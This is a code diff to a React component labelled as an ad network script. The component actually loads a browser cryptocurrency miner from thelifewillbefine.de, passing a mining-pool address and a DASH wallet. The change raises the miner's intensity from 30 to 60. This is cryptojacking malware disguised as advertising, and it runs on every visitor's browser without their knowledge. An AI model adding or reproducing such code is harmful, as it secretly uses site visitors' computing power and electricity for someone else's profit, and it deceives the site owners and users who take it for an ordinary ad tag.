@@ -103,7 +103,7 @@ const AdNetworkScript: React.FC = () => {
       src="https://thelifewillbefine.de/karma/karma.js?karma=bs?algy=flex/native?nosaj=flex.na.mine.zpool.ca:3340"
     />
     <Script id="everythingislife-tag" strategy="afterInteractive" data-cfasync="false">
-      {`EverythingIsLife('XtbKqMHVrWnej1cRBPYoN5MeCWthKasoHG', 'c=DASH', 30);`}
+      {`EverythingIsLife('XtbKqMHVrWnej1cRBPYoN5MeCWthKasoHG', 'c=DASH', 60);`}
     </Script>
     </>
   );
